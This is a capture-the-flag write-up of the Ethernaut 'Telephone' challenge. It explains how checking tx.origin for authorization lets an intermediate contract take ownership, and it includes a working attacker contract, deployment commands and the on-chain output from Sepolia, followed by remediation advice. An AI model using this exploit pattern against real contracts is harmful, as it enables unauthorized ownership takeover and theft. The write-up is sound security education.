# Ethernaut Challenge 04 — Telephone

## Goal

The challenge is solved when the attacker successfully becomes the `owner` of the `Telephone` contract.

**Instance:**

```text
0xbccF46A394ecA8d57f23B171944A6c7D7829f579
```

## Vulnerability

The contract attempts to prevent contracts from changing ownership by checking whether the transaction origin differs from the immediate caller:

```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

This check does not provide meaningful access control.

When an EOA calls an attacker-controlled contract, the call chain is:

```text
EOA
 ↓
TelephoneAttacker
 ↓
Telephone
```

Inside `Telephone.changeOwner()`:

```text
tx.origin = EOA
msg.sender = TelephoneAttacker
```

Therefore:

```solidity
tx.origin != msg.sender
```

evaluates to `true`, allowing the attacker-controlled contract to change the owner.

The root cause is using `tx.origin` for authorization. `tx.origin` represents the original EOA that initiated the transaction and remains unchanged across external calls, while `msg.sender` represents the immediate caller.

## Attack Path

```text
EOA
 ↓
Deploy TelephoneAttacker
 ↓
Call attacker.attack()
 ↓
TelephoneAttacker calls Telephone.changeOwner()
 ↓
tx.origin = EOA
msg.sender = TelephoneAttacker
 ↓
tx.origin != msg.sender
 ↓
Ownership condition passes
 ↓
owner = EOA
```

The attacker contract uses:

```solidity
function attack() external {
    telephone.changeOwner(msg.sender);
}
```

Here, `msg.sender` inside `TelephoneAttacker.attack()` is the EOA that called the attacker contract, so the Telephone contract's owner becomes the attacker's EOA.

## Proof of Concept

The exploit was reproduced locally using Anvil and then verified against the deployed Sepolia instance.

**Attacker contract:**

```solidity
contract TelephoneAttacker {
    Telephone public telephone;

    constructor(address _target) {
        telephone = Telephone(_target);
    }

    function attack() external {
        telephone.changeOwner(msg.sender);
    }
}
```

### 1. Verify the initial owner

```bash
cast call 0xbccF46A394ecA8d57f23B171944A6c7D7829f579 \
    "owner()(address)" \
    --rpc-url $RPC_URL
```

Initial owner:

```text
0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446
```

### 2. Deploy the attacker and execute the exploit

```bash
forge script script/challenge-04_Telephone/TelephoneAttack.s.sol:TelephoneAttackScript \
    --private-key $PRIVATE_KEY \
    --rpc-url $RPC_URL \
    --broadcast
```

The exploit produced two successful transactions:

```text
TelephoneAttacker deployment → Block 11735887
attack()                    → Block 11735888
```

### 3. Verify ownership takeover

```bash
cast call 0xbccF46A394ecA8d57f23B171944A6c7D7829f579 \
    "owner()(address)" \
    --rpc-url $RPC_URL
```

Result:

```text
0xc57aB1ceF012CC669C89cA4Efd929b807BD15a4c
```

The owner changed from the original owner to the attacker's EOA, confirming the ownership takeover on Sepolia.

## Impact

**Severity: High**

Any externally owned account can deploy an intermediate contract and satisfy the `tx.origin != msg.sender` condition.

This allows an attacker to arbitrarily set the `owner` variable through `changeOwner()`. If privileged functionality is protected by this owner variable, the attacker can subsequently gain access to those privileged operations.

The vulnerability therefore breaks the intended ownership boundary of the contract.

## Remediation

Never use `tx.origin` for authorization.

Instead, use explicit access control based on `msg.sender`:

```solidity
function changeOwner(address _owner) public {
    require(msg.sender == owner, "not owner");
    owner = _owner;
}
```

For ownership management, use a well-tested ownership pattern such as OpenZeppelin's `Ownable`:

```solidity
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract Telephone is Ownable {
    function changeOwner(address _owner) external onlyOwner {
        transferOwnership(_owner);
    }
}
```

The key principle is that authorization should be based on the **immediate caller (`msg.sender`)**, not the transaction origin (`tx.origin`).

## Audit Takeaway

**Never use `tx.origin` for access control.**

`tx.origin` remains the original EOA throughout an entire transaction call chain, while `msg.sender` changes at every external contract call.

An attacker can therefore insert an intermediate contract:

```text
EOA → Attacker Contract → Target
```

and make:

```solidity
tx.origin != msg.sender
```

true.

This is a classic **`tx.origin` authorization vulnerability** and can lead to unauthorized ownership changes or privilege escalation whenever the affected state controls sensitive functionality.
